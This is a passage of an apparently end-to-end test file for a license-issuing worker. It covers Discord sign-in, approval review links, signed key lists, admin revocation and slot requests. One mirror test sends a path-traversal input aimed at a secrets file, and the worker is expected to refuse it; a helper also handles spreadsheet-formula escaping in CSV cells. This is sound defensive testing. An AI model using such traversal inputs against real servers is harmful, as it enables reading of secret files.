// End-to-end test: runs the worker in wrangler's local runtime (real D1, real WebCrypto)
// against a mock Discord API, then checks the whole "Continue with Discord" flow.
//   npm test
import { spawn, execFileSync } from "node:child_process";
import { createServer } from "node:http";
import { mkdtempSync, writeFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, dirname } from "node:path";
import { fileURLToPath } from "node:url";
import assert from "node:assert/strict";

const root = join(dirname(fileURLToPath(import.meta.url)), "..");
const WORKER_PORT = 8791, APPROVAL_PORT = 8795, DISCORD_PORT = 8792, GUILD = "999000111";
let BASE = `http://127.0.0.1:${WORKER_PORT}`;
const tmp = mkdtempSync(join(tmpdir(), "orbit-license-test-"));

// Discord IDs are snowflakes: the top bits are the account's creation time.
const snowflake = (ms) => String((BigInt(ms) - 1420070400000n) << 22n);
const USERS = {
  alice: { id: snowflake(Date.parse("2019-01-01")), username: "alice", guilds: [GUILD] },
  bob:   { id: snowflake(Date.parse("2020-06-01")), username: "bob", guilds: [GUILD] },
  fresh: { id: snowflake(Date.now() - 2 * 86400000), username: "fresh", guilds: [GUILD] },
  outsider: { id: snowflake(Date.parse("2018-01-01")), username: "outsider", guilds: ["123"] },
  robot: { id: snowflake(Date.parse("2018-01-01")), username: "robot", guilds: [GUILD], bot: true },
  carol: { id: snowflake(Date.parse("2021-03-01")), username: "carol_x", guilds: [] },
  dave:  { id: snowflake(Date.parse("2021-04-01")), username: "dave", guilds: [] },
  erin:  { id: snowflake(Date.parse("2021-05-01")), username: "erin", guilds: [] },
  frank: { id: snowflake(Date.parse("2021-06-01")), username: "frank", guilds: [] },
  gina:  { id: snowflake(Date.parse("2021-07-01")), username: "gina", guilds: [] },
};

const mirrorHits = [];   // requests the worker made for /mirror
const MIRROR_UPDATE = { version: "1.9.99", url: "index-1.9.99.html", sha256: "ab".repeat(32), signature: "c2ln", notes: "Sample" };
const MIRROR_PAGE = "<!doctype html><title>FAFO 1.9.99</title><script>window.x = 1</script>\n";
const webhookPosts = [], webhookEdits = [], webhookFail = [];
const buyerHookPosts = [];   // posts to buyers' own webhooks (order alerts)
let webhookHang = null;   // {ms, code}: the next webhook post waits ms, then fails with code (if given)
const discord = createServer(async (req, res) => {
  const chunks = []; for await (const c of req) chunks.push(c);
  const raw = Buffer.concat(chunks), body = raw.toString();
  const send = (code, data) => { res.writeHead(code, { "content-type": "application/json" }); res.end(JSON.stringify(data)); };
  const who = (req.headers.authorization || "").replace("Bearer tok-", "");
  if (req.method === "POST" && req.url === "/oauth2/token") {
    const p = new URLSearchParams(body);
    if (p.get("client_secret") !== "test-secret" || p.get("redirect_uri") !== BASE + "/discord/callback") return send(401, { error: "invalid_client" });
    return USERS[p.get("code")] ? send(200, { access_token: "tok-" + p.get("code"), token_type: "Bearer" }) : send(400, { error: "invalid_grant" });
  }
  if (req.url === "/users/@me" && USERS[who]) { const u = USERS[who]; return send(200, { id: u.id, username: u.username, bot: !!u.bot }); }
  if (req.url === "/users/@me/guilds" && USERS[who]) return send(200, USERS[who].guilds.map((id) => ({ id })));
  const u = new URL(req.url, "http://x");
  if (req.method === "GET" && u.pathname === "/gh.json") return send(200, ghList);
  // GitHub's raw files, for the copy at /mirror (app 1.9.83+).
  if (u.pathname.startsWith("/mirror-src/")) {
    mirrorHits.push(req.url);
    const name = u.pathname.slice("/mirror-src/".length);
    if (name === "update.json") return send(200, MIRROR_UPDATE);
    if (name === "licenses.json") return send(200, ghList);
    if (name === "index-1.9.99.html") { res.writeHead(200, { "content-type": "text/plain" }); return res.end(MIRROR_PAGE); }
    if (name === "index-9.9.9.html") return send(500, { message: "GitHub had a moment" });
    return send(404, {});
  }
  if (req.method === "POST" && u.pathname === "/webhook") {
    if (webhookHang) {
      const hang = webhookHang; webhookHang = null;
      await new Promise((r) => setTimeout(r, hang.ms));
      if (hang.code) return send(hang.code, { message: "fail" });
    }
    if (webhookFail.length) {
      const code = webhookFail.shift();   // 0 lets that post through
      if (code) return code === 429 ? send(429, { message: "You are being rate limited.", retry_after: 0.3 }) : send(code, { message: "fail" });
    }
    let data, files = [];
    if (/^multipart\//.test(req.headers["content-type"] || "")) {
      const form = await new Response(raw, { headers: { "content-type": req.headers["content-type"] } }).formData();
      data = JSON.parse(form.get("payload_json"));
      for (const [k, v] of form) if (k.startsWith("files[")) files.push({ name: v.name, text: await v.text(), type: v.type });
    } else data = JSON.parse(body);
    const m = { id: "msg" + (webhookPosts.length + 1), wait: u.searchParams.get("wait"), files, ...data };
    webhookPosts.push(m); return send(200, { id: m.id });
  }
  if (req.method === "PATCH" && u.pathname.startsWith("/webhook/messages/")) {
    webhookEdits.push({ id: u.pathname.split("/").pop(), ...JSON.parse(body) }); return send(200, {});
  }
  if (req.method === "POST" && u.pathname.startsWith("/buyerhook/")) {
    if (u.pathname.includes("/dead/")) return send(404, { message: "Unknown Webhook" });
    buyerHookPosts.push({ path: u.pathname, ...JSON.parse(body) }); return send(200, {});
  }
  send(404, {});
});

const { publicKey, privateKey } = await crypto.subtle.generateKey({ name: "ECDSA", namedCurve: "P-256" }, true, ["sign", "verify"]);
const privJwk = await crypto.subtle.exportKey("jwk", privateKey);
// A key made by hand, on a signed list like licenses.json on GitHub.
const GH_KEY = "PVLT-GHKE-YGHK-EYGH-KEY2";
const ghHash = Array.from(new Uint8Array(await crypto.subtle.digest("SHA-256", new TextEncoder().encode("pvlt:" + GH_KEY.replace(/-/g, "")))), (b) => b.toString(16).padStart(2, "0")).join("");
// Two more for the vault tests, which need licenses of their own.
const VAULT_KEYS = ["PVLT-VAUL-TKEY-AAAA-0001", "PVLT-VAUL-TKEY-AAAA-0002"];
const hashOfKey = async (k) => Array.from(new Uint8Array(await crypto.subtle.digest("SHA-256", new TextEncoder().encode("pvlt:" + k.replace(/-/g, "")))), (b) => b.toString(16).padStart(2, "0")).join("");
const ghBody = JSON.stringify({ v: 1, issued: new Date().toISOString(), keys: [{ h: ghHash }, ...await Promise.all(VAULT_KEYS.map(async (k) => ({ h: await hashOfKey(k) })))] });
const ghList = { body: ghBody, sig: Buffer.from(await crypto.subtle.sign({ name: "ECDSA", hash: "SHA-256" }, privateKey, new TextEncoder().encode(ghBody))).toString("base64") };
const pubJwk = await crypto.subtle.exportKey("jwk", publicKey);
const common = [
  `DISCORD_CLIENT_ID=test-client`,
  `DISCORD_CLIENT_SECRET=test-secret`,
  `LICENSE_SIGNING_KEY=${JSON.stringify({ kty: "EC", crv: "P-256", x: privJwk.x, y: privJwk.y, d: privJwk.d })}`,
  `ADMIN_TOKEN=test-admin-token`,
  `DISCORD_WEBHOOK_URL=http://127.0.0.1:${DISCORD_PORT}/webhook`,
  `DISCORD_API_BASE=http://127.0.0.1:${DISCORD_PORT}`,
  `GH_LICENSE_URL=http://127.0.0.1:${DISCORD_PORT}/gh.json`,
  `MIRROR_BASE=http://127.0.0.1:${DISCORD_PORT}/mirror-src/`,
  `PULL_STALE_MS=3000`,
  `ACCOUNT_OFFER_TTL_MS=8000`,
  `ACCOUNTS_LOW_AT=3`,
  `ALERT_WEBHOOK_TEST_PREFIX=http://127.0.0.1:${DISCORD_PORT}/buyerhook/`,
  `GH_LICENSE_PUB=${JSON.stringify({ kty: "EC", crv: "P-256", x: pubJwk.x, y: pubJwk.y })}`,
];

const env = { ...process.env, NO_PROXY: "127.0.0.1,localhost", no_proxy: "127.0.0.1,localhost", CI: "1" };
// Run wrangler's JS entry with this Node, so it works the same on Windows (where .bin/wrangler is a shell script).
const wrangler = [join(root, "node_modules", "wrangler", "bin", "wrangler.js")];
const workers = [];
// Starts a worker with its own empty database, or on an earlier run's database (`db`).
// `vars` override wrangler.toml's [vars].
async function startWorker(name, port, vars, db) {
  const dir = join(tmp, db || name);
  if (!db) execFileSync(process.execPath, [...wrangler, "d1", "execute", "orbit-license", "--local", "--persist-to", dir, "--file", "schema.sql"], { cwd: root, env, stdio: "pipe" });
  writeFileSync(join(tmp, name + ".env"), [...common, ...vars].join("\n"));
  const dev = spawn(process.execPath, [...wrangler, "dev", "--local", "--ip", "127.0.0.1", "--port", String(port), "--persist-to", dir,
    "--env-file", join(tmp, name + ".env"), "--show-interactive-dev-session=false"], { cwd: root, env, stdio: ["ignore", "pipe", "pipe"] });
  let log = ""; dev.stdout.on("data", (d) => log += d); dev.stderr.on("data", (d) => log += d);
  workers.push(dev);
  BASE = `http://127.0.0.1:${port}`;
  for (let i = 0; ; i++) {
    try { if ((await fetch(BASE + "/discord/ready")).ok) return; } catch {}
    if (i > 120) throw new Error("wrangler dev didn't start:\n" + log);
    await new Promise((r) => setTimeout(r, 500));
  }
}
// On Windows, killing wrangler leaves its workerd child running (and holding the database files)
// for a while, so the whole process tree is stopped there.
function stopWorker(w) {
  if (process.platform !== "win32") return w.kill("SIGTERM");
  try { execFileSync("taskkill", ["/pid", String(w.pid), "/t", "/f"], { stdio: "ignore" }); } catch {}
}
await new Promise((r) => discord.listen(DISCORD_PORT, "127.0.0.1", r));

let passed = 0;
const test = async (name, fn) => {
  try { await fn(); passed++; console.log("  ok  " + name); }
  catch (e) { console.log("  FAIL " + name); throw e; }
};
const get = (path, opts = {}) => fetch(BASE + path, { redirect: "manual", ...opts });
const getJson = async (path, opts) => (await get(path, opts)).json();
const rid = () => crypto.randomUUID().replace(/-/g, "");
async function verifyList(list) {
  const sig = Uint8Array.from(atob(list.sig), (c) => c.charCodeAt(0));
  assert.ok(await crypto.subtle.verify({ name: "ECDSA", hash: "SHA-256" }, publicKey, sig, new TextEncoder().encode(list.body)), "list signature verifies");
  return JSON.parse(list.body);
}
async function keyHash(key) {
  const d = await crypto.subtle.digest("SHA-256", new TextEncoder().encode("pvlt:" + key.toUpperCase().replace(/[^A-Z0-9]/g, "")));
  return Array.from(new Uint8Array(d), (b) => b.toString(16).padStart(2, "0")).join("");
}
// Runs the browser half: /discord/start, then Discord sends the user back with `code`.
async function signIn(r, code, extra = "") {
  const start = await get("/discord/start?r=" + r);
  assert.equal(start.status, 302);
  const loc = new URL(start.headers.get("location"));
  const state = loc.searchParams.get("state");
  return { loc, state, page: await get(`/discord/callback?state=${encodeURIComponent(state)}${code ? "&code=" + code : ""}${extra}`) };
}
const admin = (path, body) => fetch(BASE + path, { method: body ? "POST" : "GET", headers: { authorization: "Bearer test-admin-token", "content-type": "application/json" }, body: body && JSON.stringify(body) });
// Slot CSVs reach the channel with number cells (and any cell starting with = + - @) as ="…" Excel text.
// csvRows parses a CSV; asShown parses one and reads each ="…" cell (parts joined with &) as Excel shows it.
function csvRows(text) {
  const rows = []; let row = [], cur = "", q = false;
  for (let i = 0; i < text.length; i++) {
    const ch = text[i];
    if (q) { if (ch === '"') { if (text[i + 1] === '"') { cur += '"'; i++; } else q = false; } else cur += ch; }
    else if (ch === '"') q = true;
    else if (ch === ",") { row.push(cur); cur = ""; }
    else if (ch === "\n" || ch === "\r") { if (ch === "\r" && text[i + 1] === "\n") i++; row.push(cur); rows.push(row); row = []; cur = ""; }
    else cur += ch;
  }
  if (cur || row.length) { row.push(cur); rows.push(row); }
  return rows;
}
const EXCEL_STRINGS = /^=(?:"(?:[^"]|"")*")(?:&"(?:[^"]|"")*")*$/;
const shown = (v) => EXCEL_STRINGS.test(v) ? [...v.slice(1).matchAll(/"((?:[^"]|"")*)"/g)].map((m) => m[1].replace(/""/g, '"')).join("") : v;
const asShown = (text) => csvRows(text).map((r) => r.map(shown));
const cellT = (v) => /[",\n\r]/.test(v) ? `"${v.replace(/"/g, '""')}"` : v;

try {
  console.log("Automatic mode");
  await startWorker("auto", WORKER_PORT, ["REQUIRE_APPROVAL=", `REQUIRED_GUILD_ID=${GUILD}`, "MIN_ACCOUNT_AGE_DAYS=30"]);
  let aliceKey, firstIssued;
  await test("ready reports configured", async () => assert.deepEqual(await getJson("/discord/ready"), { ready: true }));
  // A copy of GitHub's files for networks that block raw.githubusercontent.com (app 1.9.83+).
  await test("mirror: update.json, a page and licenses.json come as GitHub has them", async () => {
    mirrorHits.length = 0;
    const u = await get("/mirror/update.json?t=123");
    assert.equal(u.status, 200);
    assert.deepEqual(await u.json(), MIRROR_UPDATE);
    assert.match(u.headers.get("content-type"), /^application\/json/);
    assert.equal(u.headers.get("access-control-allow-origin"), "*");
    assert.equal(u.headers.get("cache-control"), "no-store");
    const p = await get("/mirror/index-1.9.99.html");
    assert.equal(p.status, 200);
    assert.equal(await p.text(), MIRROR_PAGE);
    assert.match(p.headers.get("content-type"), /^text\/plain/);
    assert.equal(p.headers.get("x-content-type-options"), "nosniff");
    const l = await get("/mirror/licenses.json");
    assert.deepEqual(await l.json(), ghList);
    assert.deepEqual(mirrorHits, ["/mirror-src/update.json", "/mirror-src/index-1.9.99.html", "/mirror-src/licenses.json"], "fetched by name only, without the query");
  });
  await test("mirror: a page GitHub doesn't have is 404, a GitHub error is 502", async () => {
    const a = await get("/mirror/index-1.9.98.html");
    assert.equal(a.status, 404);
    assert.equal(a.headers.get("cache-control"), "no-store");
    assert.equal((await get("/mirror/index-9.9.9.html")).status, 502);
  });
  await test("mirror: nothing but those files, and only GET", async () => {
    mirrorHits.length = 0;
    for (const p of ["/mirror/licenses.json.js", "/mirror/index-1.9.99.html.js", "/mirror/index-1.9.html", "/mirror/README.md", "/mirror/..%2Fsecrets.json",
      "/mirror/license-worker/src/index.js", "/mirror/", "/mirror/update.json/x", "/mirror/UPDATE.JSON", "/mirror/index-1.9.99.htm"]) {
      assert.equal((await get(p)).status, 404, p);
    }
    assert.equal((await get("/mirror/update.json", { method: "POST", body: "{}" })).status, 404);
    assert.deepEqual(mirrorHits, [], "GitHub wasn't asked for any of them");
  });
  await test("empty list is signed", async () => {
    const b = await verifyList(await getJson("/licenses"));
    assert.deepEqual(b.keys, []); firstIssued = b.issued;
  });
  await test("start rejects a bad request id", async () => assert.equal((await get("/discord/start?r=short")).status, 400));
  await test("start redirects to Discord with state, scopes and callback", async () => {
    const r = rid();
    const res = await get("/discord/start?r=" + r);
    const loc = new URL(res.headers.get("location"));
    assert.equal(loc.origin + loc.pathname, "https://discord.com/oauth2/authorize");
    assert.equal(loc.searchParams.get("client_id"), "test-client");
    assert.equal(loc.searchParams.get("redirect_uri"), BASE + "/discord/callback");
    assert.equal(loc.searchParams.get("scope"), "identify guilds");
    assert.ok(loc.searchParams.get("state").length >= 30);
    assert.deepEqual(await getJson("/discord/status/" + r), { status: "pending" });
  });
  await test("sign-in issues a key the app can pick up", async () => {
    const r = rid();
    const { page } = await signIn(r, "alice");
    assert.equal(page.status, 200);
    const html = await page.text();
    const s = await getJson("/discord/status/" + r);
    assert.equal(s.status, "issued");
    assert.equal(s.username, "alice");
    assert.match(s.key, /^PVLT(-[A-Z0-9]{4}){4}$/);
    assert.ok(html.includes(s.key), "callback page shows the key");
    const b = await verifyList(s.list);
    assert.deepEqual(b.keys.map((k) => k.h), [await keyHash(s.key)]);
    assert.ok(b.issued > firstIssued, "a changed list has a later issued time");
    aliceKey = s.key;
  });
  await test("owner's channel is told about the new key (without the key)", async () => {
    await new Promise((r) => setTimeout(r, 300));
    assert.equal(webhookPosts.length, 1);
    assert.match(webhookPosts[0].content, /@alice/);
    assert.ok(!webhookPosts[0].content.includes(aliceKey));
  });
  await test("the same Discord account gets the same key again", async () => {
    const r = rid();
    await signIn(r, "alice");
    const s = await getJson("/discord/status/" + r);
    assert.equal(s.key, aliceKey);
    await new Promise((r) => setTimeout(r, 300));
    assert.equal(webhookPosts.length, 1, "no second notice");
  });
  await test("reloading the callback page doesn't redo anything", async () => {
    const r = rid();
    const { state } = await signIn(r, "bob");
    const again = await get(`/discord/callback?state=${state}&code=bob`);
    assert.equal(again.status, 200);
    const html = await again.text();
    assert.match(html, /all set/);
    assert.match(html, /<title>FAFO · You&#39;re all set<\/title>/); assert.match(html, /<h1>FAFO<\/h1>/); assert.match(html, /family=Bruno\+Ace\+SC&text=FAFO/);
    assert.match(html, /Go back to FAFO/); assert.doesNotMatch(html, /Orbit/);
    const b = await verifyList(await getJson("/licenses"));
    assert.equal(b.keys.length, 2);
  });
  await test("a list with no changes isn't re-signed", async () => {
    const a = await getJson("/licenses"), b = await getJson("/licenses");
    assert.equal(a.body, b.body); assert.equal(a.sig, b.sig);
  });
  await test("cancelled sign-in reports an error to the app", async () => {
    const r = rid();
    const { page } = await signIn(r, "", "&error=access_denied");
    assert.equal(page.status, 400);
    const s = await getJson("/discord/status/" + r);
    assert.equal(s.status, "error"); assert.match(s.error, /cancelled/);
  });
  await test("bad code from Discord is an error", async () => {
    const r = rid();
    const { page } = await signIn(r, "nobody");
    assert.equal(page.status, 502);
    assert.equal((await getJson("/discord/status/" + r)).status, "error");
  });
  await test("bots are turned away", async () => {
    const r = rid(); await signIn(r, "robot");
    const s = await getJson("/discord/status/" + r);
    assert.equal(s.status, "error"); assert.match(s.error, /Bot/);
  });
  await test("accounts younger than MIN_ACCOUNT_AGE_DAYS are turned away", async () => {
    const r = rid(); await signIn(r, "fresh");
    const s = await getJson("/discord/status/" + r);
    assert.equal(s.status, "error"); assert.match(s.error, /30 days/);
  });
  await test("non-members of REQUIRED_GUILD_ID are turned away", async () => {
    const r = rid(); await signIn(r, "outsider");
    const s = await getJson("/discord/status/" + r);
    assert.equal(s.status, "error"); assert.match(s.error, /member/);
  });
  await test("unknown state and unknown request id", async () => {
    assert.equal((await get("/discord/callback?state=nope&code=alice")).status, 400);
    assert.equal((await get("/discord/status/" + rid())).status, 404);
  });
  await test("admin needs the token", async () => {
    assert.equal((await get("/admin/licenses")).status, 401);
    assert.equal((await get("/admin/licenses", { headers: { authorization: "Bearer wrong" } })).status, 401);
  });
  await test("admin lists issued keys", async () => {
    const { licenses } = await (await admin("/admin/licenses")).json();
    assert.deepEqual(licenses.map((l) => l.username).sort(), ["alice", "bob"]);
  });
  await test("revoking a key removes it from the signed list", async () => {
    const before = await verifyList(await getJson("/licenses"));
    assert.deepEqual(await (await admin("/admin/revoke", { key: aliceKey.toLowerCase() })).json(), { ok: true, changed: 1 });
    const after = await verifyList(await getJson("/licenses"));
    assert.ok(!after.keys.some((k) => k.h === before.keys[0].h));
    assert.equal(after.keys.length, 1);
    assert.ok(after.issued > before.issued);
  });
  await test("a revoked account can't get its key back by signing in", async () => {
    const r = rid(); const { page } = await signIn(r, "alice");
    assert.equal(page.status, 403);
    const s = await getJson("/discord/status/" + r);
    assert.equal(s.status, "error"); assert.match(s.error, /turned off/);
  });
  await test("restoring a key puts it back", async () => {
    await admin("/admin/restore", { discord_id: USERS.alice.id });
    const b = await verifyList(await getJson("/licenses"));
    const h = await keyHash(aliceKey);
    assert.ok(b.keys.some((k) => k.h === h));
    assert.equal(b.keys.length, 2);
  });
  await test("too many starts from one address are refused", async () => {
    let last;
    for (let i = 0; i < 25; i++) last = await get("/discord/start?r=" + rid());
    assert.equal(last.status, 429);
  });

  console.log("\nApproval mode");
  await startWorker("approval", APPROVAL_PORT, ["REQUIRE_APPROVAL=true", "REQUIRED_GUILD_ID=", "MIN_ACCOUNT_AGE_DAYS=0"]);
  webhookPosts.length = 0;
  let carolR, carolLink, carolKey;
  const reviewPost = (link, action, t) => fetch(link.split("?")[0], { method: "POST", redirect: "manual",
    body: new URLSearchParams({ t: t ?? new URL(link).searchParams.get("t"), action }) });
  const linkIn = (content) => (content.match(/\((http[^)]+\/review\/[^)]+)\)/) || [])[1];
  await test("sign-in creates a request instead of a key", async () => {
    carolR = rid();
    const { page } = await signIn(carolR, "carol");
    assert.equal(page.status, 200);
    assert.match(await page.text(), /Request sent/);
    const s = await getJson("/discord/status/" + carolR);
    assert.equal(s.status, "review"); assert.match(s.error, /approves/);
    assert.equal(s.key, undefined);
    assert.deepEqual((await verifyList(await getJson("/licenses"))).keys, []);
  });
  await test("the request is posted to the owner's channel with a review link", async () => {
    await new Promise((r) => setTimeout(r, 300));
    assert.equal(webhookPosts.length, 1);
    const m = webhookPosts[0];
    assert.equal(m.wait, "true"); assert.equal(m.flags, 4);
    assert.match(m.content, /New FAFO key request/);
    assert.match(m.content, /@carol\\_x/, "username markdown is escaped");
    assert.match(m.content, new RegExp("Discord ID " + USERS.carol.id));
    carolLink = linkIn(m.content);
    assert.ok(carolLink.startsWith(BASE + "/review/" + USERS.carol.id + "?t="));
  });
  await test("signing in again while waiting doesn't post again", async () => {
    const r = rid(); await signIn(r, "carol");
    assert.equal((await getJson("/discord/status/" + r)).status, "review");
    await new Promise((r) => setTimeout(r, 300));
    assert.equal(webhookPosts.length, 1);
  });
  await test("the review page shows the request and changes nothing by itself", async () => {
    const res = await fetch(carolLink);
    assert.equal(res.status, 200);
    const html = await res.text();
    assert.match(html, /@carol_x/); assert.match(html, /Waiting for your decision/);
    assert.doesNotMatch(html, /PVLT-/, "no key before approval");
    assert.match(html, /value="approve"/); assert.match(html, /value="deny"/);
    assert.equal((await getJson("/discord/status/" + carolR)).status, "review");
  });
  await test("a wrong or missing review token is refused", async () => {
    assert.equal((await fetch(carolLink.replace(/t=[^&]+/, "t=wrong"))).status, 404);
    assert.equal((await fetch(BASE + "/review/" + USERS.carol.id)).status, 404);
    assert.equal((await reviewPost(carolLink, "approve", "wrong")).status, 404);
    assert.equal((await getJson("/discord/status/" + carolR)).status, "review");
  });
  await test("approving issues the key, and the waiting app picks it up", async () => {
    const res = await reviewPost(carolLink, "approve");
    assert.equal(res.status, 200); assert.match(await res.text(), /Approved/);
    const s = await getJson("/discord/status/" + carolR);
    assert.equal(s.status, "issued"); assert.match(s.key, /^PVLT-/);
    assert.ok((await (await fetch(carolLink)).text()).includes(s.key), "review page shows the key once approved");
    const b = await verifyList(s.list);
    assert.deepEqual(b.keys.map((k) => k.h), [await keyHash(s.key)]);
    carolKey = s.key;
  });
  await test("the channel message is updated with the decision", async () => {
    await new Promise((r) => setTimeout(r, 300));
    assert.equal(webhookEdits.length, 1);
    assert.equal(webhookEdits[0].id, webhookPosts[0].id);
    assert.match(webhookEdits[0].content, /Approved/);
    assert.equal(linkIn(webhookEdits[0].content), carolLink, "link still there to change the decision");
    assert.equal(webhookPosts.length, 1, "no separate 'key issued' notice");
  });
  await test("once approved, signing in gives the key straight away", async () => {
    const r = rid(); await signIn(r, "carol");
    const s = await getJson("/discord/status/" + r);
    assert.equal(s.status, "issued"); assert.equal(s.key, carolKey);
  });
  let daveR, daveLink;
  await test("denying tells the app the request was declined", async () => {
    daveR = rid(); await signIn(daveR, "dave");
    await new Promise((r) => setTimeout(r, 300));
    daveLink = linkIn(webhookPosts[1].content);
    const res = await reviewPost(daveLink, "deny");
    assert.match(await res.text(), /Denied/);
    const s = await getJson("/discord/status/" + daveR);
    assert.equal(s.status, "error"); assert.match(s.error, /declined/);
    await new Promise((r) => setTimeout(r, 300));
    assert.match(webhookEdits.at(-1).content, /Denied/);
  });
  await test("a denied account signing in again is told, without a new post", async () => {
    const r = rid(); const { page } = await signIn(r, "dave");
    assert.equal(page.status, 403);
    assert.match((await getJson("/discord/status/" + r)).error, /declined/);
    await new Promise((r) => setTimeout(r, 300));
    assert.equal(webhookPosts.length, 2);
  });
  await test("changing a denial to approval issues the key", async () => {
    await reviewPost(daveLink, "approve");
    const r = rid(); await signIn(r, "dave");
    assert.equal((await getJson("/discord/status/" + r)).status, "issued");
  });
  await test("denying after approval turns the key off", async () => {
    await reviewPost(carolLink, "deny");
    const b = await verifyList(await getJson("/licenses"));
    const h = await keyHash(carolKey);
    assert.ok(!b.keys.some((k) => k.h === h));
    const r = rid(); const { page } = await signIn(r, "carol");
    assert.equal(page.status, 403);
    assert.match((await getJson("/discord/status/" + r)).error, /declined/);
    assert.doesNotMatch(await (await fetch(carolLink)).text(), /PVLT-/, "no key once denied");
  });
  await test("admin lists requests and decisions, with working review links", async () => {
    const { applications } = await (await admin("/admin/applications")).json();
    assert.deepEqual(applications.map((a) => [a.username, a.status]).sort(), [["carol_x", "denied"], ["dave", "approved"]]);
    const dave = applications.find((a) => a.username === "dave");
    assert.equal(dave.review_token, undefined);
    assert.equal(dave.review_url, daveLink);
    assert.equal((await fetch(dave.review_url)).status, 200);
  });
  await test("a request whose channel post failed is posted again on the next sign-in", async () => {
    const before = webhookPosts.length;
    webhookFail.push(500);
    const r1 = rid(); await signIn(r1, "erin");
    await new Promise((r) => setTimeout(r, 500));
    assert.equal(webhookPosts.length, before, "first post failed");
    assert.equal((await getJson("/discord/status/" + r1)).status, "review");
    const r2 = rid(); await signIn(r2, "erin");
    await new Promise((r) => setTimeout(r, 500));
    assert.equal(webhookPosts.length, before + 1);
    assert.match(webhookPosts.at(-1).content, /@erin/);
    const r3 = rid(); await signIn(r3, "erin");
    await new Promise((r) => setTimeout(r, 500));
    assert.equal(webhookPosts.length, before + 1, "not posted again once it went through");
  });
  await test("a rate-limited post waits as Discord asks and goes through", async () => {
    const before = webhookPosts.length;
    webhookFail.push(429);
    await signIn(rid(), "gina");
    await new Promise((r) => setTimeout(r, 1500));
    assert.equal(webhookPosts.length, before + 1);
    assert.match(webhookPosts.at(-1).content, /@gina/);
  });
  await test("denying someone before they had a key", async () => {
    const erinLink = linkIn(webhookPosts.find((m) => /@erin/.test(m.content)).content);
    await reviewPost(erinLink, "deny");
    const r = rid(); const { page } = await signIn(r, "erin");
    assert.equal(page.status, 403);
  });

  console.log("\nApproval switched off again, same database");
  stopWorker(workers.pop());
  await new Promise((r) => setTimeout(r, 1500));
  await startWorker("approval-off", APPROVAL_PORT + 1, ["REQUIRE_APPROVAL=", "REQUIRED_GUILD_ID=", "MIN_ACCOUNT_AGE_DAYS=0"], "approval");
  await test("denied accounts stay declined", async () => {
    const r = rid(); const { page } = await signIn(r, "erin");
    assert.equal(page.status, 403);
    assert.match((await getJson("/discord/status/" + r)).error, /declined/);
  });
  let frankKey;
  await test("new accounts get a key straight away again", async () => {
    const r = rid(); await signIn(r, "frank");
    const s = await getJson("/discord/status/" + r);
    assert.equal(s.status, "issued"); assert.match(s.key, /^PVLT-/);
    frankKey = s.key;
  });

  console.log("\nSlots");
  const slots = (path, key, body) => fetch(BASE + path, { method: body ? "POST" : "GET", headers: { ...(key ? { authorization: "Bearer " + key } : {}), "content-type": "application/json" }, body: body && JSON.stringify(body) });
  const slotLink = (content) => (content.match(/\((http[^)]+\/slots\/review\/[^)]+)\)/) || [])[1];
  const slotPost = (link, action, amount) => fetch(link.split("?")[0], { method: "POST", body: new URLSearchParams({ t: new URL(link).searchParams.get("t"), action, ...(amount != null ? { amount: String(amount) } : {}) }) });
  let frankLink;
  await test("the limit needs a valid license key", async () => {
    assert.equal((await slots("/slots/limit")).status, 401);
    assert.equal((await slots("/slots/limit", "PVLT-AAAA-BBBB-CCCC-DDDD")).status, 401);
    assert.equal((await slots("/slots/limit", "not a key")).status, 401);
  });
  await test("everyone starts at 20 slots", async () => {
    assert.deepEqual(await (await slots("/slots/limit", frankKey)).json(), { limit: 20, request: null, canRequest: true });
  });
  await test("keys made by hand (the GitHub list) work too", async () => {
    assert.equal((await (await slots("/slots/limit", GH_KEY.toLowerCase())).json()).limit, 20);
  });
  await test("asking for fewer slots than you have, or too many, is refused", async () => {
    assert.equal((await slots("/slots/request", frankKey, { requested: 20 })).status, 400);
    assert.equal((await slots("/slots/request", frankKey, { requested: 501 })).status, 400);
    assert.equal((await slots("/slots/request", frankKey, { requested: "lots" })).status, 400);
  });
  await test("a request is posted to the owner's channel with a review link", async () => {
    const before = webhookPosts.length;
    const r = await (await slots("/slots/request", frankKey, { requested: 40, name: "Frank_the_*shopper*", note: "Big drop\nthis weekend" })).json();
    assert.equal(r.status, "pending"); assert.equal(r.request.requested, 40);
    await new Promise((ok) => setTimeout(ok, 400));
    assert.equal(webhookPosts.length, before + 1);
    const m = webhookPosts.at(-1).content;
    assert.match(m, /More slots requested/); assert.match(m, /20 → 40 slots/);
    assert.match(m, /Frank\\_the\\_\\\*shopper\\\*/, "name is markdown-escaped");
    assert.match(m, /@frank/); assert.match(m, new RegExp("license …" + frankKey.slice(-4)));
    assert.match(m, /Big drop this weekend/, "note kept on one line");
    frankLink = slotLink(m);
    assert.ok(frankLink.startsWith(BASE + "/slots/review/"));
    const lim = await (await slots("/slots/limit", frankKey)).json();
    assert.equal(lim.limit, 20); assert.equal(lim.request.status, "pending");
  });
  await test("asking again while one is waiting doesn't post again", async () => {
    const before = webhookPosts.length;
    const r = await (await slots("/slots/request", frankKey, { requested: 60 })).json();
    assert.equal(r.status, "pending"); assert.equal(r.request.requested, 40);
    await new Promise((ok) => setTimeout(ok, 300));
    assert.equal(webhookPosts.length, before);
  });
  await test("the review page needs the right token and changes nothing by itself", async () => {
    assert.equal((await fetch(frankLink.replace(/t=[^&]+/, "t=nope"))).status, 404);
    assert.equal((await slotPost(frankLink.replace(/t=[^&]+/, "t=nope"), "approve")).status, 404);
    const html = await (await fetch(frankLink)).text();
    assert.match(html, /asked for <strong>40<\/strong>/); assert.match(html, /Waiting for your decision/);
    assert.equal((await (await slots("/slots/limit", frankKey)).json()).limit, 20);
  });
  await test("approving can grant a different number, and the channel message is updated", async () => {
    const res = await slotPost(frankLink, "approve", 35);
    assert.match(await res.text(), /can now use 35 slots/);
    const lim = await (await slots("/slots/limit", frankKey)).json();
    assert.equal(lim.limit, 35); assert.equal(lim.request.status, "approved"); assert.equal(lim.request.granted, 35);
    await new Promise((ok) => setTimeout(ok, 300));
    assert.match(webhookEdits.at(-1).content, /Approved: 35 slots/);
  });
  await test("an out-of-range amount is refused on the review page", async () => {
    assert.match(await (await slotPost(frankLink, "approve", 0)).text(), /between 1 and 500/);
    assert.equal((await (await slots("/slots/limit", frankKey)).json()).limit, 35);
  });
  await test("denying after approving puts the limit back", async () => {
    await slotPost(frankLink, "deny");
    const lim = await (await slots("/slots/limit", frankKey)).json();
    assert.equal(lim.limit, 20); assert.equal(lim.request.status, "denied");
